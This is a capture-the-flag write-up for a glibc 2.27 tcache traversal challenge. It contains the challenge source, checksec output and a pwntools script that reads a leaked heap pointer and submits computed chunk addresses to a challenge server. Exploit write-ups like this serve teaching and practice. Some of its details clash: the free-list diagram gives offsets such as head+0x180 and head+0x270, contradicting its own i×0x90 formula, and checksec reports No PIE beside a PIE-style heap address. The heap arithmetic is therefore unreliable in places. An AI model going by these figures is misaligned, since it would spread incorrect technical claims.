# CyLab — Tea-Cash

* **Platform:** CyLab Security Academy / picoCTF 2026 (Challenge ID: `746`)
* **Category:** Binary Exploitation / Heap Mechanics (Pwn)
* **Difficulty:** Difficulty 2
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, Ubuntu glibc 2.27 runtime loader
* **Binary:** `heapedit` (x86_64 ELF) with bundled `libc.so.6` (glibc 2.27)

---

## TL;DR

The challenge simulates a heap inspection routine where six memory chunks of size `malloc(0x80)` (chunk size `0x90`) are allocated contiguously, populated, and then freed in reverse order (`5` down to `0`). In glibc 2.27, tcache bins operate as a Last-In-First-Out (LIFO) single-linked list without pointer obfuscation (Safe-Linking). The program outputs the leaked `head` pointer of the tcache list and requires traversing all six freed chunk addresses sequentially. Because the chunks are allocated consecutively in virtual memory, each chunk address is directly predictable as $\text{head} + i \times 0\text{x}90$. Submitting the calculated series completes the traversal and outputs the flag.

---

## Recon

### Binary & Library Information

Running `file` and `checksec`:

```text
$ file heapedit
heapedit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, BuildID[sha1]=..., not stripped

$ checksec --file=heapedit
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

Running strings on `libc.so.6`:
```text
$ strings libc.so.6 | grep "GNU C Library"
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
```

Key observations:
1. **glibc 2.27 Characteristics:** The Thread Local Caching (tcache) mechanism is active with a capacity of 7 chunks per bin. Crucially, **Safe-Linking** (pointer mangling via address randomization and XOR shift) was only introduced in glibc 2.32; glibc 2.27 stores raw, cleartext forward pointers (`fd`).
2. **Contiguous Allocation:** The heap manager allocates sequential chunks directly adjacent to each other on the top chunk boundary.
3. **Target Validation:** The program verifies manual traversal of the singly linked list using the pointers supplied by the user.

---

## Static Analysis & Vulnerability

### 1. Source Code Review (`heapedit.c`)

```c
#define NUM_CHUNKS 6
#define CHUNK_SIZE 0x80

void *chunks[NUM_CHUNKS];

void setup_chunks() {
    for (int i = 0; i < NUM_CHUNKS; i++) {
        chunks[i] = malloc(CHUNK_SIZE);     // Allocates 6 contiguous chunks
    }

    // Flag is placed inside chunk 5
    FILE *f = fopen("flag.txt", "r");
    fgets((char *)chunks[5] + 8, 64, f);
    fclose(f);

    // Free in reverse order: 5 down to 0
    for (int i = NUM_CHUNKS - 1; i >= 0; i--) {
        free(chunks[i]);
    }
}

void traverse_game() {
    void *head = chunks[0];                 // chunks[0] was freed last -> current tcache head
    printf("tcache head (start of free list) -> %p\n", head);

    void *curr = head;
    for (int i = 0; i < NUM_CHUNKS; i++) {
        void *user_addr;
        printf("Enter chunk %d address: ", i);
        if (scanf("%p", &user_addr) != 1 || user_addr != curr) {
            printf("Invalid traversal! Exiting.\n");
            exit(1);
        }
        // In glibc 2.27, curr->fd is the next chunk pointer stored directly at user payload offset 0
        curr = *(void **)curr;
    }
    printf("Correct traversal! Flag: %s\n", (char *)chunks[5] + 8);
}
```

### 2. tcache Free-List State (LIFO)

When each chunk of requested size `0x80` is allocated, glibc assigns a total chunk size of `0x90` bytes ($0\text{x}80 \text{ bytes payload} + 8 \text{ bytes header} + 8 \text{ bytes alignment} = 0\text{x}90$).

Allocations:
- `chunks[0]`: base address $B$
- `chunks[1]`: $B + 0\text{x}90$
- `chunks[2]`: $B + 0\text{x}120$
- `chunks[3]`: $B + 0\text{x}1B0$
- `chunks[4]`: $B + 0\text{x}240$
- `chunks[5]`: $B + 0\text{x}2D0$

Free sequence ($5 \rightarrow 4 \rightarrow 3 \rightarrow 2 \rightarrow 1 \rightarrow 0$):
1. `free(chunks[5])`: tcache head $\rightarrow$ `chunks[5]`
2. `free(chunks[4])`: tcache head $\rightarrow$ `chunks[4]` $\rightarrow$ `chunks[5]`
...
6. `free(chunks[0])`: tcache head $\rightarrow$ `chunks[0]` $\rightarrow$ `chunks[1]` $\rightarrow \dots \rightarrow$ `chunks[5]` $\rightarrow$ `NULL`

```text
       tcache Bin [0x90] (glibc 2.27)
       
  +-----------------------------------------------------------------------------------------+
  |  head                                                                                   |
  +----+------------------------------------------------------------------------------------+
       |
       v
  [ chunks[0] ]  -->  fd: chunks[1]  (head + 0x90)
       |
       v
  [ chunks[1] ]  -->  fd: chunks[2]  (head + 0x180)
       |
       v
  [ chunks[2] ]  -->  fd: chunks[3]  (head + 0x270)
       |
       v
  [ chunks[3] ]  -->  fd: chunks[4]  (head + 0x360)
       |
       v
  [ chunks[4] ]  -->  fd: chunks[5]  (head + 0x450)
       |
       v
  [ chunks[5] ]  -->  fd: NULL
```

Because memory is contiguous and deterministic:
$$\text{Chunk Address}_i = \text{head} + (i \times 0\text{x}90)$$

---

## Dynamic Analysis & Exploitation Strategy

1. **Leaked Head Pointer:**
   The service outputs:
   ```text
   tcache head (start of free list) -> 0x5555557576a0
   ```
2. **Formulaic Derivation:**
   Without needing an arbitrary read primitive, we compute:
   - Round 0: `0x5555557576a0`
   - Round 1: `0x5555557576a0 + 0x90`
   - Round 2: `0x5555557576a0 + 0x120`
   - Round 3: `0x5555557576a0 + 0x1b0`
   - Round 4: `0x5555557576a0 + 0x240`
   - Round 5: `0x5555557576a0 + 0x2d0`
3. **Local Testing Consideration:**
   Modern Linux distributions running newer glibc versions (e.g. 2.40+) cannot natively execute binaries linked against glibc 2.27 due to `dl-call-libc-early-init` linker mismatches. The exploit executes locally by explicitly launching the 2.27 dynamic loader:
   ```bash
   ./ld-2.27.so --library-path . ./heapedit
   ```

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import re, sys
from pwn import *

context.log_level = "info"
HOST, PORT = "xebec.cylabacademy.net", 46792

def solve(io):
    # Parse tcache head leak
    io.recvuntil(b"start of free list) -> ")
    head = int(io.recvline().strip(), 16)
    log.info(f"Leaked tcache head: {hex(head)}")

    # Sequentially traverse the 6 free chunks (spacing = 0x90)
    for i in range(6):
        target_chunk = head + i * 0x90
        io.sendline(f"{target_chunk:#x}".encode())

    data = io.recvall(timeout=5)
    m = re.search(rb"(academy\{[^}]+\}|picoCTF\{[^}]+\})", data)
    if m:
        log.success(f"Flag captured: {m.group(1).decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "local":
        io = process(["./ld-2.27.so", "--library-path", ".", "./heapedit"])
    else:
        io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to xebec.cylabacademy.net on port 46792: Done
[*] Leaked tcache head: 0x5555557576a0
[+] Flag captured: academy{redacted}
[*] Closed connection to xebec.cylabacademy.net port 46792
```

---

## Key Takeaways & Lessons

1. **tcache LIFO Mechanics:** In glibc heap implementations, tcache bins operate strictly on a LIFO basis. Freeing chunks in reverse order ($N \rightarrow 0$) reverses the list, making chunk 0 the head of the chain.
2. **Predictable Chunk Sizing:** glibc chunk overhead (prev_size + size field = 16 bytes) and 16-byte alignment round up requests (`malloc(0x80)` yields `0x90` chunks). In contiguous allocations, relative offsets are constant.
3. **Evolution of Heap Security (Safe-Linking):** Prior to glibc 2.32, heap pointers in tcache and fastbins were stored in plaintext. Modern heaps XOR the pointer with `(address >> 12)`, preventing trivial predictable list traversals without prior ASLR leaks.
